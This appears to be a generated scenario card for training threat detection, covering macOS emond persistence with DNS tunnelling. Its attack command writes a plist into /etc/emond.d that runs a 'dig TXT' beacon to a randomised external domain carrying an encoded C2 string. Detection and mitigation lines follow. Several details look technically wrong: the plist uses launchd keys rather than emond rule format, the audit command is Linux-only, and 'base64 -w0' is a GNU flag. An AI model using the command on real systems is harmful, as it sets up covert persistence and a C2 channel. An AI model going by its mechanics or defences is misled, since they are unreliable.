---
type: campaign
scenario_id: 468
tactic: Persistence
technique: "T1546.014: Emond"
technique_id: T1546.014
tags: [campaign, lotl, persistence]
---

# Using emond for DNS tunneling persistence on macOS.

## Threat Description
Using emond for DNS tunneling persistence on macOS.

## Attack Command
```
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)</string><key>ProgramArguments</key><array><string>dig</string><string>+short</string><string>TXT</string><string>$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)</string></array><key>RunAtLoad</key><true/></dict></plist>' > /etc/emond.d/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist
```

## Detection Logic
Monitor emond plists: `cat /etc/emond.d/* | grep dig | grep TXT`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.

## Mitigation
Restrict emond writes: `chmod 600 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.

## AI Training Prompt
Train AI to detect emond-based DNS tunneling persistence by analyzing plist modifications, dig TXT commands, and DNS query patterns; suggest emond protections.

## References
- MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
